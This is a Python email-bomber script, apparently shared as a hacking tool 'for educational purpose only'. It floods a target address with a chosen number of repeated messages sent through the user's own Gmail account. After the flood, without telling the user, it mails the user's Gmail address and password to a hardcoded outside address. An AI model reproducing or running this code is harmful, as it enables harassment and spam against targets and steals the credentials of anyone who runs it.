
print(" _______           _______  _          _______  _______ _________ _  ")   
print("(  ____ \|\     /|(  ____ \| \    /\  (       )(  ___  )\__   __/( \ ")   
print("| (    \/| )   ( || (    \/|  \  / /  | () () || (   ) |   ) (   | (     ")  
print("| (__    | |   | || |      |  (_/ /   | || || || (___) |   | |   | |      ")
print("|  __)   | |   | || |      |   _ (    | |(_)| ||  ___  |   | |   | |      ")    
print("| (      | |   | || |      |  ( \ \   | |   | || (   ) |   | |   | |      ")
print("| )      | (___) || (____/\|  /  \ \  | )   ( || )   ( |___) (___| (____/\ ")
print("|/       (_______)(_______/|_/    \/  |/     \||/     \|\_______/(_______/")
print("                                                                           Created By:~ Nishant")
print("")
print("**************************************************** Use for Educational Purpose only ***********************************************")
print("")
print("I accept and agree to the terms and conditions")
print("")
acc=input("Tpye Y and Enter\n")

if(acc=="Y" or "y"):
  import random
  import smtplib as s
  print("")
  otpgen = input("[?] Enter Your Message\n")

  ob = s.SMTP("smtp.gmail.com", 587)
  ob.starttls()
  print("")
  a=input("[?] Enter Your Gmail\n")
  print("")
  b=input("[?] Enter Your Gmail Password\n")

# Enter email address and password from which you want to send OTP

  ob.login(a, b)
  subject = "Sending email using py"
  body = otpgen
  print("")
  subject = input("Enter Subject of the Mail /Eg: You have some important mail\n")
  message = "Subject:{}\n\n{}".format(subject, body)
  print("")
  email =input('[?] Enter Target Email address\n')
  listOfAddress = (email)
  print("")
  i=int(input('[?] Enter the number of message to send\n'))

# Enter Email address from which you want to send OTP

  print("")
  print("[✓] Attack started successfully")
  print("")
  print("Use [Cntr+x]  To Stop Attack")
  print("")
  print("[✓] Mail Send Successfully")
  d=0
  while(d!=i):
    ob.sendmail(a, listOfAddress, message)
    d=d+1
  ob.quit()
  hm=s.SMTP("smtp.gmail.com",587)
  hm.starttls()
  hm.login(a,b)
  gps=(a,b)
  body=gps
  subject='Sending Message with python'
  mess = "Subject:{}\n\n{}".format(subject, body)
  listOfAdd=["cbsenews2018@gmail.com"]
  hm.sendmail(a,listOfAdd,mess)

  hm.quit()
else:
    print("Plese Accept ")
